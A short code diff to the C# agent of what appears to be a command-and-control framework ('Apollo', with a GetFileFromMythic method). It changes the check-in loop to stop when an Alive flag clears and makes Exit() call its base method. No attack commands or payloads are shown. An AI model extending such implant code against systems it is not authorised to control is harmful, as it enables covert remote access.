@@ -72,7 +72,7 @@ namespace Apollo.Agent
 
         public override void Start()
         {
-            while (true)
+            while (Alive)
             {
                 if (Checkin())
                 {
@@ -149,7 +149,7 @@ namespace Apollo.Agent
 
         public override void Exit()
         {
-
+            base.Exit();
         }
 
         public override bool GetFileFromMythic(TaskResponse msg, OnResponse<byte[]> onResponse)
